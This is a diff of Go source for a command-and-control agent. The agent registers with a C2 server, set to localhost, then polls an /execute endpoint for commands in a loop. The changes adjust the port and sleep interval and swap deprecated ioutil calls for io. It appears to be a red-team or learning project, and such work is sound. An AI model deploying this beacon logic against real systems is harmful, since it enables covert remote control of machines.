@@ -2,7 +2,7 @@ package main
 
 import (
 	"fmt"
-	"io/ioutil"
+	"io"
 	"log"
 	"net/http"
 	"net/url"
@@ -12,13 +12,11 @@ import (
 )
 
 var c2server = "localhost"
-var c2serverport = "80"
+var c2serverport = "8080"
 
 func main() {
 	agentId := ""
-	// sleep := time.Duration(10)
-	sleep := 10
-	// resp, err := http.Get("http://localhost:80/register")
+	sleep := 60
 	c2register := "http://" + c2server + ":" + c2serverport + "/register"
 	register_resp, err := http.Get(c2register)
 
@@ -28,7 +26,7 @@ func main() {
 
 	defer register_resp.Body.Close()
 
-	body, err := ioutil.ReadAll(register_resp.Body)
+	body, err := io.ReadAll(register_resp.Body)
 	agentId = string(body)
 	if err != nil {
 		log.Fatal(err)
@@ -41,7 +39,6 @@ loop:
 		data := url.Values{
 			"agentId": {agentId},
 		}
-		// resp2, err := http.PostForm("http://localhost:80/execute", data)
 		c2execute := "http://" + c2server + ":" + c2serverport + "/execute"
 		execute_response, err := http.PostForm(c2execute, data)
 
@@ -52,7 +49,7 @@ loop:
 
 		defer execute_response.Body.Close()
 
-		command, err := ioutil.ReadAll(execute_response.Body)
+		command, err := io.ReadAll(execute_response.Body)
 
 		if string(command) == "no commands found" {
 			log.SetFlags(0)
